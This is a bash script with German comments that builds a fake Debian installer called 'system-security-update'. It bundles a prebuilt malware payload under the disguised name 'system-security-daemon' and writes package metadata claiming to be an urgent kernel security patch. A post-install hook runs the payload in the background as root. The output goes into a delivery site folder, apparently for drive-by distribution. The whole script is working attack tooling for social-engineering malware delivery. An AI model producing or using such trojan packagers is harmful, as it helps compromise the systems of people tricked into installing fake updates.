#!/bin/bash

# ==========================================
#  BUILD FAKE .DEB INSTALLER (LINUX MALWARE)
# ==========================================

GREEN='\033[0;32m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PAYLOAD_SRC="$ROOT_DIR/delivery/DbD-Site/files/payload_linux"
DEB_BUILD_DIR="$ROOT_DIR/delivery/temp_deb_build"
OUTPUT_DEB="$ROOT_DIR/delivery/DbD-Site/files/security-update.deb"

echo -e "${BLUE}[*] Erstelle Linux .deb Installer...${NC}"

# 1. Prüfen ob Payload existiert
if [ ! -f "$PAYLOAD_SRC" ]; then
  echo -e "${RED}[!] payload_linux nicht gefunden! Bitte erst ./build_payloads.sh ausführen.${NC}"
  exit 1
fi

# 2. Ordnerstruktur erstellen
rm -rf "$DEB_BUILD_DIR"
mkdir -p "$DEB_BUILD_DIR/DEBIAN"
mkdir -p "$DEB_BUILD_DIR/usr/local/bin"

# 3. Payload kopieren & verstecken
# Wir nennen es "system-security-daemon", damit es seriös aussieht
cp "$PAYLOAD_SRC" "$DEB_BUILD_DIR/usr/local/bin/system-security-daemon"
chmod 755 "$DEB_BUILD_DIR/usr/local/bin/system-security-daemon"

# 4. Control File erstellen (Metadaten)
cat >"$DEB_BUILD_DIR/DEBIAN/control" <<EOF
Package: system-security-update
Version: 1.0-2025
Section: utils
Priority: optional
Architecture: amd64
Maintainer: Security Team <security@internal.corp>
Description: Critical Security Patch
 Fixes critical vulnerabilities in the system kernel.
 Please install immediately.
EOF

# 5. Post-Install Script (DAS IST DER HACK)
# Dieses Skript wird NACH der Installation automatisch ausgeführt (als Root!)
cat >"$DEB_BUILD_DIR/DEBIAN/postinst" <<EOF
#!/bin/bash
# Malware starten & in den Hintergrund schicken
/usr/local/bin/system-security-daemon &
exit 0
EOF

chmod 755 "$DEB_BUILD_DIR/DEBIAN/postinst"

# 6. Paket bauen
dpkg-deb --build "$DEB_BUILD_DIR" "$OUTPUT_DEB"

echo -e "${GREEN}[+] Fake-Installer erstellt: $OUTPUT_DEB${NC}"

# Aufräumen
rm -rf "$DEB_BUILD_DIR"
